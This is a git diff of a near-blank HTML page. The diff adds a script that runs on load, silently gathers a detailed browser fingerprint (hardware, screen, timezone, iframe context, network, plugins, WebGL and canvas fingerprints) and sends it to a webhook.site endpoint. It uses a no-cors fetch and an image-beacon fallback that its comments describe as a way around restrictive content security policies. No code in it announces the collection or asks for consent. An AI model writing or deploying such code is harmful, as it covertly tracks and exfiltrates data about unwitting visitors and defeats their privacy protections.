@@ -1,18 +1,148 @@
 <!DOCTYPE html>
 <html>
-<head></head>
+<head><title>.</title></head>
 <body>
 <script>
-  fetch("https://webhook.site/959fa6ae-59d6-49fb-b8ba-2d945836e96f", {
-    method: "POST",
-    mode: "no-cors",
-    body: JSON.stringify({
-      referrer: document.referrer,
-      userAgent: navigator.userAgent,
-      language: navigator.language,
-      url: window.location.href
-    })
+(function() {
+  var WH = 'https://webhook.site/959fa6ae-59d6-49fb-b8ba-2d945836e96f';
+
+  function safe(fn, fb) {
+    try { return fn(); } catch(e) { return fb !== undefined ? fb : 'blocked'; }
+  }
+
+  // --- NAVEGADOR ---
+  var browser = {
+    ua:          navigator.userAgent,
+    vendor:      navigator.vendor,
+    platform:    safe(function(){ return navigator.platform; }),
+    language:    navigator.language,
+    languages:   safe(function(){ return navigator.languages.join(','); }),
+    dnt:         navigator.doNotTrack,
+    cookieEnabled: navigator.cookieEnabled,
+    online:      navigator.onLine,
+    cores:       safe(function(){ return navigator.hardwareConcurrency; }),
+    memory:      safe(function(){ return navigator.deviceMemory; }),
+    maxTouch:    safe(function(){ return navigator.maxTouchPoints; }),
+    pdfViewer:   safe(function(){ return navigator.pdfViewerEnabled; })
+  };
+
+  // --- PANTALLA ---
+  var display = {
+    width:       screen.width,
+    height:      screen.height,
+    availW:      screen.availWidth,
+    availH:      screen.availHeight,
+    colorDepth:  screen.colorDepth,
+    pixelDepth:  screen.pixelDepth,
+    pixelRatio:  window.devicePixelRatio,
+    orientation: safe(function(){ return screen.orientation.type; })
+  };
+
+  // --- TIEMPO Y UBICACIÓN ---
+  var temporal = {
+    timezone:    Intl.DateTimeFormat().resolvedOptions().timeZone,
+    locale:      Intl.DateTimeFormat().resolvedOptions().locale,
+    offset:      new Date().getTimezoneOffset(),
+    ts:          new Date().toISOString()
+  };
+
+  // --- CONTEXTO DEL IFRAME ---
+  var context = {
+    href:        window.location.href,
+    referrer:    document.referrer,
+    frameDepth:  safe(function(){
+                   var d = 0, w = window;
+                   while(w !== w.parent){ d++; w = w.parent; }
+                   return d;
+                 }),
+    parentFrames: safe(function(){ return window.parent.frames.length; }),
+    isIframe:    (window !== window.top),
+    topBlocked:  safe(function(){ var t = window.top.location.href; return false; }, true)
+  };
+
+  // --- RED ---
+  var network = safe(function(){
+    var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if(!c) return 'unavailable';
+    return {
+      type:       c.effectiveType,
+      downlink:   c.downlink,
+      rtt:        c.rtt,
+      saveData:   c.saveData
+    };
   });
+
+  // --- PLUGINS (legacy pero útil para fingerprinting) ---
+  var plugins = safe(function(){
+    var p = [];
+    for(var i = 0; i < navigator.plugins.length; i++){
+      p.push(navigator.plugins[i].name);
+    }
+    return p.join('|');
+  });
+
+  // --- CAPACIDADES ---
+  var capabilities = {
+    webGL:       safe(function(){
+                   var c = document.createElement('canvas');
+                   var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+                   if(!gl) return 'no';
+                   return gl.getParameter(gl.RENDERER);
+                 }),
+    canvas:      safe(function(){
+                   var c = document.createElement('canvas');
+                   c.width = 200; c.height = 50;
+                   var ctx = c.getContext('2d');
+                   ctx.textBaseline = 'top';
+                   ctx.font = '14px Arial';
+                   ctx.fillText('fingerprint', 2, 2);
+                   return c.toDataURL().slice(-50);
+                 }),
+    localStorage: safe(function(){ localStorage.setItem('t','1'); localStorage.removeItem('t'); return 'ok'; }, 'blocked'),
+    sessionStorage: safe(function(){ sessionStorage.setItem('t','1'); sessionStorage.removeItem('t'); return 'ok'; }, 'blocked'),
+    indexedDB:   safe(function(){ return !!window.indexedDB; }),
+    serviceWorker: safe(function(){ return 'serviceWorker' in navigator; }),
+    webRTC:      safe(function(){ return !!(window.RTCPeerConnection || window.mozRTCPeerConnection); }),
+    battery:     safe(function(){ return !!navigator.getBattery; })
+  };
+
+  // --- PERFORMANCE ---
+  var perf = safe(function(){
+    var t = performance.timing || {};
+    return {
+      loadTime: Date.now() - (t.navigationStart || Date.now()),
+      memory:   safe(function(){ return performance.memory ? performance.memory.usedJSHeapSize : 'na'; })
+    };
+  });
+
+  // --- PAYLOAD COMPLETO ---
+  var payload = {
+    browser:      browser,
+    display:      display,
+    temporal:     temporal,
+    context:      context,
+    network:      network,
+    plugins:      plugins,
+    capabilities: capabilities,
+    perf:         perf
+  };
+
+  // Exfiltrar por fetch (no-cors)
+  fetch(WH, {
+    method: 'POST',
+    mode: 'no-cors',
+    body: JSON.stringify(payload)
+  });
+
+  // Backup por Image beacon (más compatible con CSP restrictivos)
+  new Image().src = WH + '/beacon?t=' + Date.now() +
+    '&tz=' + encodeURIComponent(temporal.timezone) +
+    '&lang=' + encodeURIComponent(browser.language) +
+    '&res=' + display.width + 'x' + display.height +
+    '&cores=' + browser.cores +
+    '&mem=' + browser.memory;
+
+})();
 </script>
 </body>
 </html>
